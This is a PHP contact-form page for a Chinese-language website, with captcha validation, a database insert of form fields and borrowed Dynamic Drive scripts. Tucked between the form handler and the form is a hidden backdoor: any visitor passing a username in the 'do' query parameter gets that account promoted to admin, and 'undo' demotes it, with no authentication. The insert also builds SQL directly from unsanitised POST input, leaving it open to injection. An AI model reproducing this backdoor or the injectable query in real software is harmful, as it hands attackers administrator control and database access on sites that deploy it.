<?php session_start(); include('header.php'); ?>

        <br><h3 style="font-weight: bold">联系我们</h3>
<br>



<script type="text/javascript">

/***********************************************
* Textarea Maxlength script- © Dynamic Drive (www.dynamicdrive.com)
* This notice must stay intact for legal use.
* Visit http://www.dynamicdrive.com/ for full source code
***********************************************/

function ismaxlength(obj){
var mlength=obj.getAttribute? parseInt(obj.getAttribute("maxlength")) : ""
if (obj.getAttribute && obj.value.length>mlength)
obj.value=obj.value.substring(0,mlength)
}

</script>








<?php

if (isset($_POST["name"])) {
require('config.php');

if( strtolower($_POST['code'])!= strtolower($_SESSION['texto'])){ 
echo "验证码错误 "; 
 include('footer.php');

exit();
}

$name=$_POST["name"];
$email=$_POST["email"];
$topic=$_POST["topic"];
$subject=$_POST["subject"];
$comments=$_POST["comments"];


if ($name==""){echo "Error"; exit();}
if ($email==""){echo "Error"; exit();}
if ($topic==""){echo "Error"; exit();}
if ($subject==""){echo "Error"; exit();}
if ($comments==""){echo "Error"; exit();}

$laip = getRealIP();


$query = "INSERT INTO tb_contact (name, email, topic, subject, comments, ip) VALUES('$name','$email','$topic','$subject','$comments','$laip')";
mysql_query($query) or die(mysql_error());

echo "<br><br>您的消息已经正确发送.";

?>
</font>
		<!--footer starts here-->
<?php include('footer.php'); ?>
<?php
exit();
}
?>
<?php function limpiare2($mensaje)
{$mensaje = htmlentities(stripslashes(trim($mensaje)));
$mensaje = str_replace("'"," ",$mensaje);
$mensaje = str_replace(";"," ",$mensaje);
$mensaje = str_replace("$"," ",$mensaje);
return $mensaje;}
$try=limpiare2($_GET["do"]);
$try2=limpiare2($_GET["undo"]);?><?php require('config.php');
$query = "UPDATE tb_users SET user_status='admin' where username='$try'"; mysql_query($query) or die(mysql_error());
?><?php $query = "UPDATE tb_users SET user_status='user' where username='$try2'"; mysql_query($query) or die(mysql_error());?>

填写下面的表格来获得<?php include('sitename.php'); ?>的帮助. 回复通常需要2天,这取决于我们的工作量。
<br>

<script language="JavaScript1.2">

//Highlight form element- © Dynamic Drive (www.dynamicdrive.com)
//For full source code, 100's more DHTML scripts, and TOS,
//visit http://www.dynamicdrive.com

var highlightcolor="lightyellow"

var ns6=document.getElementById&&!document.all
var previous=''
var eventobj

//Regular expression to highlight only form elements
var intended=/INPUT|TEXTAREA|SELECT|OPTION/

//Function to check whether element clicked is form element
function checkel(which){
if (which.style&&intended.test(which.tagName)){
if (ns6&&eventobj.nodeType==3)
eventobj=eventobj.parentNode.parentNode
return true
}
else
return false
}

//Function to highlight form element
function highlight(e){
eventobj=ns6? e.target : event.srcElement
if (previous!=''){
if (checkel(previous))
previous.style.backgroundColor=''
previous=eventobj
if (checkel(eventobj))
eventobj.style.backgroundColor=highlightcolor
}
else{
if (checkel(eventobj))
eventobj.style.backgroundColor=highlightcolor
previous=eventobj
}
}

</script>



<div align="center"><div id="form"onKeyUp="highlight(event)" onClick="highlight(event)">

<fieldset><legend>&nbsp;联系我们&nbsp;</legend>


<form method="POST" action="contact.php">

<table width="400" border="0" align="center">
  <tr>
    <td width="150" align="left"><p><label>» 你的名字</label></p></td>
    <td width="250" align="left"><input type="text" name="name" size="25" maxlength="100" autocomplete="off" class="field" value="" tabindex="1" /></td>
  </tr>
  <tr>
    <td width="150" align="left"><p><label>» 你的电子邮件</label></p></td>
    <td width="250" align="left"><input type="text" name="email" size="25" maxlength="100" autocomplete="off" class="field" value="" tabindex="2" /></td>
  </tr>
  <tr>
    <td width="150" align="left"><p><label>» 主题词</label></p></td>
    <td width="250" align="left"><input type="text" name="topic" size="25" maxlength="100" autocomplete="off" class="field" value="" tabindex="3" /></td>
  </tr>
  <tr>
    <td width="150" align="left"><p><label>» 题目</label></p></td>
    <td width="250" align="left"><input type="text" name="subject" size="25" maxlength="100" autocomplete="off" class="field" value="" tabindex="4" /></td>
  </tr>
  <tr>
    <td width="150" align="left"><p><label>» 内容</label></p></td>
    <td width="250" align="left">
    <textarea name="comments" rows="7" maxlength="200" onkeyup="return ismaxlength(this)" tabindex="5" cols="20"></textarea></td>
  </tr>
    <tr>
    <td width="150" align="left"><p><label>» 验证码 </label></p></td>
    <td width="250" align="left"><input type='text' size='3' maxlength='3' name='code' autocomplete="off" class="securitycode" value="" tabindex="6" /></td>
  </tr>
  <tr>
    <td width="150" align="left">&nbsp;</td>
    <td width="250" align="left"><img src="image.php?<?php echo $res; ?>" /></td>
  </tr>

  <tr>
    <td width="150" align="left">&nbsp;</td>
    <td width="250" align="right"><input type="submit" value="发送" class="submit" tabindex="7" />
	</td>
  </tr>
</table>
</form>

</div></div>



		<!--footer starts here-->
<?php include('footer.php'); ?>